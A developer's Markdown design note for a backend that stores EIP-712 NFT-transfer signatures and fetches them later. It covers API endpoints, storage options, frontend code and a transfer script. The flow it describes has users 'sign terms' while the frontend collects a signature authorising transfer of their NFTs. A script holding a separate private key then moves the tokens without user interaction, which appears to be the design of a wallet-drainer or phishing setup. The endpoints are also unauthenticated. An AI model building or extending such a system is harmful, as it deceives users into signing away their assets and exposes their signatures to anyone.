# Signature Backend Implementation

## Overview

Signatures are now stored server-side via API endpoints, allowing you to access them from anywhere to execute transfers without needing the user's browser.

## API Endpoints

### 1. Store Signature
**POST** `/api/store-signature`

Stores an EIP-712 signature for NFT transfer authorization.

**Request Body:**
```json
{
  "wallet": "0x67252aCF497134CC5c8f840a38b5f59Fc090Af83",
  "signature": "0x...",
  "nftContract": "0x298AbE38965DC68d239192d4366ab8c5b65a3B6f",
  "tokenIds": ["1", "2", "3", "4", "5"],
  "deadline": 1735689600,
  "nonce": 0,
  "timestamp": "2024-01-20T00:00:00.000Z"
}
```

**Response:**
```json
{
  "success": true,
  "message": "Signature stored successfully",
  "wallet": "0x67252acf497134cc5c8f840a38b5f59fc090af83",
  "nftContract": "0x298abe38965dc68d239192d4366ab8c5b65a3b6f",
  "tokenCount": 5,
  "deadline": 1735689600
}
```

### 2. Get Signatures
**GET** `/api/get-signatures?wallet=0x...`

Retrieves all stored signatures for a wallet.

**Response:**
```json
{
  "success": true,
  "wallet": "0x67252acf497134cc5c8f840a38b5f59fc090af83",
  "signatures": {
    "0x298abe38965dc68d239192d4366ab8c5b65a3b6f": {
      "signature": "0x...",
      "deadline": 1735689600,
      "nonce": 0,
      "nftContract": "0x298abe38965dc68d239192d4366ab8c5b65a3b6f",
      "tokenIds": ["1", "2", "3", "4", "5"],
      "timestamp": "2024-01-20T00:00:00.000Z"
    }
  },
  "count": 1
}
```

## Current Implementation

### Storage
Currently using **in-memory storage** (Map) which will be lost on serverless function restart.

### Production Upgrade
For production, replace with persistent storage:

**Option 1: Vercel Postgres**
```javascript
import { sql } from '@vercel/postgres';

// Store
await sql`
  INSERT INTO signatures (wallet, nft_contract, signature, token_ids, deadline, nonce)
  VALUES (${wallet}, ${nftContract}, ${signature}, ${JSON.stringify(tokenIds)}, ${deadline}, ${nonce})
`;

// Retrieve
const result = await sql`
  SELECT * FROM signatures WHERE wallet = ${wallet}
`;
```

**Option 2: MongoDB**
```javascript
await db.collection('signatures').insertOne({
  wallet,
  nftContract,
  signature,
  tokenIds,
  deadline,
  nonce,
  timestamp: new Date()
});
```

**Option 3: Vercel KV (Redis)**
```javascript
import { kv } from '@vercel/kv';

await kv.set(`signature:${wallet}:${nftContract}`, JSON.stringify(sigData));
const sigData = await kv.get(`signature:${wallet}:${nftContract}`);
```

## Frontend Integration

Signatures are automatically sent to the backend when collected:

```javascript
// In getTransferSignatures function
await fetch(`${API_URL}/api/store-signature`, {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({
    wallet: ownerAddress,
    signature: sigData.signature,
    nftContract: contractAddress,
    tokenIds: sigData.tokenIds,
    deadline: sigData.deadline,
    nonce: sigData.nonce,
    timestamp: sigData.timestamp
  })
});
```

## Transfer Script

The transfer script now fetches signatures from the backend:

```bash
# Set API URL (defaults to babelon.xyz)
export API_URL=https://babelon.xyz
export PRIVATE_KEY=0x... # Contract owner or authorized signer
export NFT_OWNER_WALLET=0x67252aCF497134CC5c8f840a38b5f59Fc090Af83

# Run transfer
node transfer-with-stored-signature.js
```

## Environment Variables

### Frontend
- `REACT_APP_API_URL` - Backend API URL (defaults to current origin)

### Backend/Transfer Script
- `API_URL` - Backend API URL (defaults to https://babelon.xyz)
- `PRIVATE_KEY` - Private key for executing transfers
- `NFT_OWNER_WALLET` - Wallet address to transfer NFTs from

## Flow

1. **User signs terms** → Frontend collects EIP-712 signature
2. **Frontend sends to backend** → POST to `/api/store-signature`
3. **Backend stores signature** → Currently in-memory, should use database
4. **Later, transfer script runs** → GET from `/api/get-signatures`
5. **Transfer executed** → Using stored signature, no user interaction needed

## Next Steps

1. ✅ API endpoints created
2. ✅ Frontend updated to send signatures
3. ✅ Transfer script updated to fetch from backend
4. ⚠️ **TODO**: Replace in-memory storage with database (Vercel Postgres/KV/MongoDB)
5. ⚠️ **TODO**: Add authentication/authorization to API endpoints
6. ⚠️ **TODO**: Add rate limiting
7. ⚠️ **TODO**: Add signature expiration cleanup job
